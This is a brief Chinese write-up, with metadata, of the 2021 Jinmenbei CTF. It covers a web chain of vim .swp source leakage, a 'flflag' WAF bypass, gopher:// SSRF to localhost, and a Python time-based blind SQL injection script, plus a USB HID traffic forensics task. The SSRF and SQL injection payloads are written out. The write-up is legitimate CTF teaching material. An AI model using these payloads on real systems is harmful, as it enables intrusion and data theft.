---
title: 津⻔杯-WriteUp
contest: 津门杯
year: 2021
difficulty: medium
vuln_type: ssrf
tags: [.swp源码泄露, 反序列化, gopher SSRF, 时间盲注, USB流量, m0usb]
attack_chain: Web:.index.php.swp源码泄露→flflag双写绕WAF→gopher://127.0.0.1:80 SSRF打内网+POST参数时间盲注爆破table→MISC:m0usb USB流量
key_payload: ".index.php.swp;gopher://127.0.0.1:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0D%0A;mid((select group_concat(table_name) from information_schema.tables),{i},1)='{c}' and sleep(1);USB HID m0usb"
one_liner: 津门杯：.swp源码+反序列化+flflag双写+gopher SSRF+时间盲注+USB流量
lesson: .swp文件vim临时文件泄露+flflag双写绕WAF+gopher://SSRF打内网HTTP
quality: medium
---

# 津⻔杯-WriteUp

**赛事**：津门杯（2021）

**WEB**：
- `.index.php.swp` vim临时文件泄露源码
- `flflag`双写绕过flag过滤
- gopher://127.0.0.1:80 SSRF打内网 → POST /admin.php
- 时间盲注爆破数据库：
  ```python
  sql = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
  for i in range(1, 50):
      for c in charset:
          post = f"poc=mid(({sql}),{i},1)='{c}' and sleep(1) "
          t = send(post)
          if t >= 0.3:
              result += c
              break
  ```
- 表：emails, flag, referers, uagents, users

**MISC - m0usb**：
- USB流量数据（HID键盘/鼠标）
- 每行8字节，2字节1行
- 格式：`00:00:25:00:00:00:00:00` → 解析为键盘按键或鼠标移动
- 数据模式分析按键
- 工具：m0usb

**关键技术**：
- .swp vim临时文件源码泄露
- flflag双写WAF绕过
- gopher://协议构造POST请求打内网HTTP
- 时间盲注字符级爆破
- USB流量HID协议解析

**质量评估**：中（payload具体，flag部分展示）
